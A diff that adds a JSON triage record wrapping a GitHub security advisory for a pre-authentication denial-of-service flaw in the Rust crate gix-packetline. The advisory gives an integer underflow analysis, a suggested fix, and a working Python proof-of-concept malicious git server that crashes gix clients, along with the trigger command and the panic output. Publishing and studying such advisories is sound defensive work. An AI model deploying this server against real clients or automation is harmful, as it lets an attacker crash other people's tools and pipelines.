@@ -1,0 +1,56 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/50370416?v=4\", \"events_url\": \"https://api.github.com/users/KutalVolkan/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/KutalVolkan/followers\", \"following_url\": \"https://api.github.com/users/KutalVolkan/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/KutalVolkan/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/KutalVolkan\", \"id\": 50370416, \"login\": \"KutalVolkan\", \"node_id\": \"MDQ6VXNlcjUwMzcwNDE2\", \"organizations_url\": \"https://api.github.com/users/KutalVolkan/orgs\", \"received_events_url\": \"https://api.github.com/users/KutalVolkan/received_events\", \"repos_url\": \"https://api.github.com/users/KutalVolkan/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/KutalVolkan/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/KutalVolkan/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/KutalVolkan\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-191\", \"name\": \"Integer Underflow (Wrap or Wraparound)\"}], \"description\": \"### Summary\\n`gix-packetline` panics when it receives a side-band packet line that contains only the band-id byte with an empty payload. A malicious Git server - or any remote a victim clones/fetches from - can abort the `gix` client process during a normal fetch. This is a pre-authentication, network-triggered denial of service.\\n\\n### Details\\nIn `gix-packetline/src/lib.rs`, `impl From<&[u8]> for TextRef` strips a trailing newline with `d[d.len() - 1]`:\\nhttps://github.com/GitoxideLabs/gitoxide/blob/eac50e1207e2549b23302c9faf595a420b9919fc/gix-packetline/src/lib.rs#L199\\nWhen `d` is empty (an empty side-band payload after the band-id byte is removed), `d.len() - 1` underflows `usize` (to `18446744073709551615`, i.e. `0 - 1`) and the index access panics. The empty side-band line is attacker-supplied and is reached during a normal fetch.\\n\\n(Related: an unchecked `split_at_mut` in `gix-packetline/src/blocking_io/read.rs` is in the same DoS class and worth hardening in the same pass.)\\n\\n### PoC\\nConfirmed against `gix v0.54.0` (crate `gix-packetline 0.21.4`) and current `main`.\\n\\n1. Run a minimal malicious git server on `127.0.0.1:9418`. It completes a protocol-v2 handshake (ls-refs, fetch), then sends a packfile header followed by the bytes `0005` + `0x02` - a side-band line of length 5 whose content is the single band-id byte `0x02` with an EMPTY payload:\\n\\n```python\\nimport socket\\nHOST, PORT = \\\"127.0.0.1\\\", 9418\\ndef pkt(d): return (\\\"%04x\\\" % (len(d)+4)).encode() + d\\nFLUSH=b\\\"0000\\\"; OID=b\\\"1234567890123456789012345678901234567890\\\"\\ndef handle(c):\\n    c.recv(65536)\\n    c.sendall(pkt(b\\\"version 2\\\\n\\\")+pkt(b\\\"agent=git/evil\\\\n\\\")+pkt(b\\\"ls-refs=unborn\\\\n\\\")\\n              +pkt(b\\\"fetch=shallow wait-for-done\\\\n\\\")+pkt(b\\\"object-format=sha1\\\\n\\\")+FLUSH)\\n    buf=b\\\"\\\"; sent=False\\n    while True:\\n        d=c.recv(65536)\\n        if not d: return\\n        buf+=d\\n        if b\\\"command=ls-refs\\\" in buf and not sent:\\n            c.sendall(pkt(OID+b\\\" HEAD symref-target:refs/heads/master\\\\n\\\")\\n                      +pkt(OID+b\\\" refs/heads/master\\\\n\\\")+FLUSH); sent=True; buf=b\\\"\\\"; continue\\n        if b\\\"command=fetch\\\" in buf and (buf.rstrip().endswith(b\\\"0000\\\") or b\\\"done\\\" in buf):\\n            c.sendall(pkt(b\\\"packfile\\\\n\\\") + b\\\"0005\\\\x02\\\")   # band id 2, EMPTY payload\\n            try: c.recv(4096)\\n            except Exception: pass\\n            return\\ns=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\\ns.bind((HOST,PORT)); s.listen(1); print(\\\"listening\\\",PORT)\\nconn,_=s.accept(); conn.settimeout(5.0)\\ntry: handle(conn)\\nfinally: conn.close(); s.close()\\n```\\n\\n2. Point the real client at it:\\n```\\nRUST_BACKTRACE=1 gix clone git://127.0.0.1:9418/repo.git /tmp/out\\n```\\n\\nObserved:\\n```\\nthread 'main' panicked at gix-packetline/src/lib.rs:199:20:\\nindex out of bounds: the len is 0 but the index is 18446744073709551615\\nexit code: 101\\n```\\n### Impact\\nA pre-authentication, network-triggered denial of service. Any tool, library, or CI pipeline that clones/fetches from an attacker-influenced remote using `gix` / `gix-packetline` crashes (process abort). No authentication is required, and in unattended automation no user interaction gates the fetch.\\n\\n### Suggested fix\\nGuard the empty-slice case instead of indexing unconditionally, e.g. `let d = d.strip_suffix(b\\\"\\\\n\\\").unwrap_or(d);`, or check `!d.is_empty()` / `d.last() == Some(&b'\\\\n')` before slicing.\", \"ghsa_id\": \"GHSA-2vh6-hw4j-32ww\", \"github_reviewed_at\": \"2026-08-28T16:09:59Z\", \"html_url\": \"https://github.com/advisories/GHSA-2vh6-hw4j-32ww\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-2vh6-hw4j-32ww\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-28T16:09:59Z\", \"references\": [\"https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-2vh6-hw4j-32ww\", \"https://github.com/GitoxideLabs/gitoxide/pull/2638\", \"https://github.com/GitoxideLabs/gitoxide/commit/4bef04ae8a261634200b3a6faabdd77e25aeb8c1\", \"https://github.com/GitoxideLabs/gitoxide/releases/tag/gix-packetline-v0.21.5\", \"https://github.com/advisories/GHSA-2vh6-hw4j-32ww\"], \"repository_advisory_url\": \"https://api.github.com/repos/GitoxideLabs/gitoxide/security-advisories/GHSA-2vh6-hw4j-32ww\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/GitoxideLabs/gitoxide\", \"summary\": \"gix-packetline: reachable panic on empty side-band packet (pre-auth network DoS)\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-28T16:10:01Z\", \"url\": \"https://api.github.com/advisories/GHSA-2vh6-hw4j-32ww\", \"vulnerabilities\": [{\"first_patched_version\": \"0.21.5\", \"package\": {\"ecosystem\": \"rust\", \"name\": \"gix-packetline\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.21.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-2vh6-hw4j-32ww",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "gix-packetline: <= 0.21.4"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "gix-packetline"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-28T21:56:46.684412Z",
+  "provenance": {
+    "content_sha256": "7c36cc514029ffd8d7f91e22dcf9c9f268170644555ebb58c18466f9dbc9c753",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-28T16:09:59Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-2vh6-hw4j-32ww",
+  "status": "active",
+  "title": "gix-packetline: reachable panic on empty side-band packet (pre-auth network DoS)",
+  "updated_at": "2026-08-28T16:10:01Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-2vh6-hw4j-32ww"
+}
